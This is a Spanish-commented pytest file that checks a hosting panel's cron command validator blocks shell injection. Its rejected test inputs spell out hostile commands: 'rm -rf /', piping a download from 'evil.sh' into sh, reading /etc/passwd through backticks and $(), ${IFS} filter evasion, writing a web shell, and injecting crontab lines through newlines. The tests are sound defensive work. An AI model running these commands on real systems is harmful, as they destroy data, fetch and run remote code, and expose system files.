"""
Validación del comando de un cron job (api/schemas/cron_schemas.py).

Contexto: la lista de metacaracteres peligrosos existía pero estaba declarada y
NUNCA se recorría (se usaban dos listas reducidas escritas a mano aparte), así
que $(), |, &, > y < pasaban la validación aunque el código pareciese
bloquearlos. Estos tests fijan el contrato para que no vuelva a divergir.
"""

import pytest
from pydantic import ValidationError

from api.schemas.cron_schemas import CronJobCreate, CronJobUpdate


def _create(command: str):
    return CronJobCreate(command=command)


# ───────────────────────── comandos que DEBEN pasar ──────────────────────────

@pytest.mark.parametrize("cmd", [
    "/usr/bin/php /home/user/web/ejemplo.com/public_html/cron.php",
    "php8.2 /usr/local/bin/wp cron event run --due-now --path=/home/u/web/d/public_html",
    "/home/user/scripts/backup.sh",
    "/usr/bin/curl -s https://ejemplo.com/tarea",
    "/usr/bin/python3 /home/user/app/tarea.py --verbose",
    # Rutas con guiones, puntos y números: nada de esto es un metacarácter.
    "/opt/mi-app_v2/bin/run.sh --config=/etc/mi-app/prod.ini",
])
def test_comandos_legitimos_pasan(cmd):
    assert _create(cmd).command == cmd


def test_el_comando_del_wp_cron_del_panel_es_valido():
    """El propio panel genera este comando (wp_manager.wp_cron_command). Si la
    validación lo rechazara, el panel no podría crear sus propios crons."""
    from scripts.wp_manager import wp_cron_command
    cmd = wp_cron_command("/home/user/web/ejemplo.com/public_html", "8.2")
    assert _create(cmd).command == cmd


def test_se_hace_strip_de_espacios():
    assert _create("  /bin/true  ").command == "/bin/true"


# ──────────────────── metacaracteres que DEBEN rechazarse ────────────────────

@pytest.mark.parametrize("cmd,motivo", [
    ("/bin/true; rm -rf /",                  "encadenar con ;"),
    ("/bin/true && curl evil.sh",            "AND lógico"),
    ("/bin/true || curl evil.sh",            "OR lógico"),
    ("wget -qO- http://evil.sh | sh",        "tubería a shell"),
    ("echo `cat /etc/passwd`",               "backticks"),
    ("echo $(cat /etc/passwd)",              "sustitución POSIX"),
    ("cat /etc${IFS}/passwd",                "expansión ${} para evadir filtros"),
    ("/bin/true > /home/user/public_html/shell.php", "redirección de salida"),
    ("/bin/true >> /var/log/mio.log",        "redirección de append"),
    ("/bin/true 2>&1",                       "redirección de descriptores"),
    ("/bin/sh < /tmp/payload",               "redirección de entrada"),
    ("/usr/bin/minero &",                    "segundo plano"),
])
def test_metacaracteres_de_shell_rechazados(cmd, motivo):
    with pytest.raises(ValidationError):
        _create(cmd)


def test_saltos_de_linea_rechazados():
    """Un \\n partiría la línea del crontab e inyectaría entradas que el panel
    no controla ni muestra, saltándose el wrapper de historial."""
    for cmd in ["/bin/true\n0 0 * * * curl evil.sh",
                "/bin/true\r0 0 * * * curl evil.sh"]:
        with pytest.raises(ValidationError):
            _create(cmd)


def test_comando_vacio_rechazado():
    for cmd in ["", "   "]:
        with pytest.raises(ValidationError):
            _create(cmd)


# ──────────────── Update aplica exactamente las mismas reglas ────────────────

def test_update_aplica_las_mismas_reglas():
    """La lógica estaba duplicada entre Create y Update; ahora comparten helper.
    Este test evita que una de las dos se quede atrás si se añade una regla."""
    with pytest.raises(ValidationError):
        CronJobUpdate(command="echo $(id)")
    with pytest.raises(ValidationError):
        CronJobUpdate(command="wget -qO- http://evil.sh | sh")
    ok = "/usr/bin/php /home/user/web/d/public_html/cron.php"
    assert CronJobUpdate(command=ok).command == ok


def test_update_permite_command_ausente():
    """command es opcional en Update: omitirlo no debe fallar."""
    assert CronJobUpdate(minute="5").command is None


def test_comment_rechaza_saltos_de_linea_pero_permite_metacaracteres():
    """El comment se escribe como '# ...' en el crontab: un salto de línea sí es
    peligroso (inyecta una línea), pero un ';' o '|' dentro de un comentario no
    se ejecuta, así que no hay motivo para rechazarlo."""
    with pytest.raises(ValidationError):
        CronJobCreate(command="/bin/true", comment="ok\n0 0 * * * curl evil.sh")
    assert CronJobCreate(command="/bin/true",
                         comment="backup (rota | comprime)").comment is not None
